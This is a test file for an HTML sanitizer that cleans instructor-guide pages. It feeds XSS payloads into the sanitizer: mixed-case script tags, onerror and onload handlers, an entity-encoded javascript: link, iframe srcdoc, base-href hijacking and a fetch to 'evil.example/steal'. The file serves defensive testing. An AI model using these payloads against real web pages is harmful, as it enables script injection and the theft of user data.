import { describe, expect, it } from 'vitest';
import { sanitizeGuiaHtml } from '../../../lib/guias-instrutor/html-sanitizer';

const CLEAN_SAMPLE = `<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="utf-8"/><title>Guia</title>
<style>.toolbar{display:none!important}</style></head>
<body><div class="toolbar"><button onclick="window.print()">Imprimir</button></div>
<section><img src="../assets/logo.png"/><h1>Guia do Instrutor</h1></section>
</body></html>`;

describe('sanitizeGuiaHtml', () => {
  it('remove scripts arbitrários e reporta a contagem', () => {
    const html = `<html><body><script>fetch('https://evil.example/steal')</script><p>ok</p></body></html>`;
    const result = sanitizeGuiaHtml(html);
    expect(result.scriptsRemovidos).toBe(1);
    expect(result.html).not.toContain('<script');
    expect(result.aprovado).toBe(true);
  });

  it('remove iframes, forms e referências externas', () => {
    const html = `<html><body>
      <iframe src="https://tracker.example/x"></iframe>
      <form action="https://evil.example/collect"><input name="x"/></form>
      <a href="https://external.example/">link</a>
    </body></html>`;
    const result = sanitizeGuiaHtml(html);
    expect(result.html).not.toContain('<iframe');
    expect(result.html).not.toContain('<form');
    expect(result.aprovado).toBe(true);
  });

  it('remove handlers de evento inline (onclick etc.)', () => {
    const result = sanitizeGuiaHtml(CLEAN_SAMPLE);
    expect(result.html).not.toMatch(/onclick=/i);
    expect(result.aprovado).toBe(true);
  });

  it('rejeita referência a localhost', () => {
    const html = `<html><body><a href="http://localhost:8787/admin">debug</a></body></html>`;
    const result = sanitizeGuiaHtml(html);
    expect(result.aprovado).toBe(false);
    expect(result.alertas.join(' ')).toMatch(/localhost/i);
  });

  it('preserva conteúdo textual/estrutural legítimo', () => {
    const result = sanitizeGuiaHtml(CLEAN_SAMPLE);
    expect(result.html).toContain('Guia do Instrutor');
    expect(result.html).toContain('class="toolbar"');
  });

  it('remove src relativo não resolvido (nunca mantém "como está")', () => {
    const result = sanitizeGuiaHtml(CLEAN_SAMPLE);
    expect(result.html).not.toContain('assets/logo.png');
    expect(result.aprovado).toBe(true);
  });

  it('embute asset local como data: URI quando o mapa de assets é fornecido', () => {
    const png1x1 = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
      'base64',
    );
    const result = sanitizeGuiaHtml(CLEAN_SAMPLE, {
      'logo.png': { bytes: new Uint8Array(png1x1), mimeType: 'image/png' },
    });
    expect(result.html).toMatch(/src="data:image\/png;base64,[A-Za-z0-9+/=]+"/);
    expect(result.aprovado).toBe(true);
  });

  it('não sobra script/iframe/form residual em HTML limpo', () => {
    const result = sanitizeGuiaHtml(CLEAN_SAMPLE);
    expect(result.aprovado).toBe(true);
    expect(result.alertas.filter((a) => a.includes('residual'))).toHaveLength(0);
  });

  it('preserva <meta charset> (achado de QA visual: sem isso o documento vira mojibake)', () => {
    const result = sanitizeGuiaHtml(CLEAN_SAMPLE);
    expect(result.html).toMatch(/<meta[^>]*charset="utf-8"[^>]*>/i);
  });

  it('preserva <meta charset> e <meta name=viewport>, mas descarta <meta http-equiv=refresh> no mesmo documento', () => {
    const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="0;url=https://example.com"></head><body>ok</body></html>`;
    const result = sanitizeGuiaHtml(html);
    expect(result.html).toMatch(/<meta[^>]*charset="utf-8"[^>]*>/i);
    expect(result.html).toMatch(/<meta[^>]*name="viewport"[^>]*>/i);
    expect(result.html.toLowerCase()).not.toMatch(/http-equiv/);
  });

  describe('payloads adversariais (parser estrutural, não regex)', () => {
    const wrap = (body: string) => `<!DOCTYPE html><html><body>${body}</body></html>`;

    it('neutraliza <ScRiPt> com capitalização mista', () => {
      const result = sanitizeGuiaHtml(wrap('<ScRiPt>alert(1)</ScRiPt><p>ok</p>'));
      expect(result.html.toLowerCase()).not.toContain('<script');
      expect(result.html).not.toContain('alert(1)');
      expect(result.scriptsRemovidos).toBe(1);
    });

    it('neutraliza onerror em <img> mesmo sem fechamento explícito', () => {
      const result = sanitizeGuiaHtml(wrap('<img src=x onerror=alert(1)>'));
      expect(result.html).not.toMatch(/onerror/i);
      expect(result.html).not.toContain('alert(1)');
    });

    it('neutraliza onload em <svg> removendo a tag inteira', () => {
      const result = sanitizeGuiaHtml(wrap('<svg onload=alert(1)><circle/></svg>'));
      expect(result.html.toLowerCase()).not.toContain('<svg');
      expect(result.html).not.toMatch(/onload/i);
    });

    it('neutraliza javascript: com entidades HTML no href (bypass de regex ingênuo)', () => {
      const result = sanitizeGuiaHtml(wrap('<a href="jav&#x61;script:alert(1)">x</a>'));
      // O parser decodifica a entidade estruturalmente — não sobra o valor
      // decodificado "javascript:alert(1)" em nenhum atributo href/src.
      expect(result.html).not.toMatch(/href\s*=\s*["']javascript:/i);
      expect(result.html).not.toContain('javascript:alert');
    });

    it('remove <iframe srcdoc> inteiro, mesmo com script embutido no srcdoc', () => {
      const result = sanitizeGuiaHtml(wrap('<iframe srcdoc="<script>alert(1)</script>"></iframe>'));
      expect(result.html.toLowerCase()).not.toContain('<iframe');
      expect(result.html).not.toContain('alert(1)');
    });

    it('remove <meta http-equiv=refresh>', () => {
      const result = sanitizeGuiaHtml(
        wrap('<meta http-equiv="refresh" content="0;url=https://example.com">'),
      );
      expect(result.html.toLowerCase()).not.toMatch(/http-equiv/);
      expect(result.html).not.toContain('example.com');
    });

    it('remove @import externo dentro de <style>', () => {
      const html = `<!DOCTYPE html><html><head><style>@import url(https://example.com/x.css);</style></head><body>ok</body></html>`;
      const result = sanitizeGuiaHtml(html);
      expect(result.html).not.toContain('@import');
      expect(result.html).not.toContain('example.com');
    });

    it('remove url() externo em style inline', () => {
      const result = sanitizeGuiaHtml(
        wrap('<div style="background:url(https://example.com/x)">x</div>'),
      );
      expect(result.html).not.toContain('example.com');
    });

    it('remove <object data="data:text/html,...">', () => {
      const result = sanitizeGuiaHtml(
        wrap('<object data="data:text/html,<script>alert(1)</script>"></object>'),
      );
      expect(result.html.toLowerCase()).not.toContain('<object');
      expect(result.html).not.toContain('alert(1)');
    });

    it('remove <base href> (hijack de URLs relativas)', () => {
      const result = sanitizeGuiaHtml(
        `<!DOCTYPE html><html><head><base href="https://example.com/"></head><body>ok</body></html>`,
      );
      expect(result.html.toLowerCase()).not.toContain('<base');
      expect(result.html).not.toContain('example.com');
    });

    it('remove <form>/<input> mesmo aninhados em conteúdo aparentemente legítimo', () => {
      const result = sanitizeGuiaHtml(
        wrap('<form action="https://evil.example/collect"><input name="x" value="y"/><button>Enviar</button></form>'),
      );
      expect(result.html.toLowerCase()).not.toContain('<form');
      expect(result.html.toLowerCase()).not.toContain('<input');
      expect(result.html.toLowerCase()).not.toContain('<button');
    });

    it('remove <link> externo (não usado no material real, bloqueado por padrão)', () => {
      const result = sanitizeGuiaHtml(
        `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://example.com/x.css"></head><body>ok</body></html>`,
      );
      expect(result.html.toLowerCase()).not.toContain('<link');
    });

    it('todos os payloads adversariais em conjunto ficam aprovados (nada residual)', () => {
      const kitchen = wrap(`
        <ScRiPt>alert(1)</ScRiPt>
        <img src=x onerror=alert(1)>
        <svg onload=alert(1)></svg>
        <a href="jav&#x61;script:alert(1)">x</a>
        <iframe srcdoc="<script>alert(1)</script>"></iframe>
        <style>@import url(https://example.com/x.css)</style>
        <div style="background:url(https://example.com/x)">x</div>
        <object data="data:text/html,<script>alert(1)</script>"></object>
      `);
      const result = sanitizeGuiaHtml(kitchen);
      expect(result.aprovado).toBe(true);
      expect(result.alertas.filter((a) => a.includes('residual'))).toHaveLength(0);
      expect(result.html).not.toContain('alert(1)');
      expect(result.html).not.toContain('example.com');
    });
  });
});
